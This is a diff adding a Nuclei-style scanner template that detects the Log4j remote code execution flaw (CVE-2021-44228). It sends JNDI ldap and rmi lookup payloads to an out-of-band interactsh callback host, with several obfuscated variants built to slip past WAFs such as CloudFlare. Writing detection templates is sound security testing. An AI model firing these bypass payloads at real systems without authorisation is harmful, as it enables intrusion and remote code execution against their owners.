@@ -1,0 +1,31 @@
+id: log4j-rce-detect-waf-bypass
+
+info:
+  name: Apache Log4j RCE (CVE-2021-44228) Detection with WAF Bypass (CloudFlare etc.)
+  author: toramanemre
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=${jndi:ldap://{{interactsh-url}}/poc}"
+      - "{{BaseURL}}/?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{interactsh-url}}poc}"
+      - "{{BaseURL}}/?q=${${::-j}ndi:rmi://{{interactsh-url}}/poc}"
+      - "{{BaseURL}}/?q=${jndi:rmi://{{interactsh-url}}}"
+      - "{{BaseURL}}/?q=${${lower:jndi}:${lower:rmi}://{{interactsh-url}}/poc}"
+      - "{{BaseURL}}/?q=${${lower:${lower:jndi}}:${lower:rmi}://{{interactsh-url}}/poc}"
+      - "{{BaseURL}}/?q=${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{interactsh-url}}/poc}"
+      - "{{BaseURL}}/?q=${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{interactsh-url}}/poc}"
+
+    headers:
+      Host: "{{Host}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
+
+
+
+
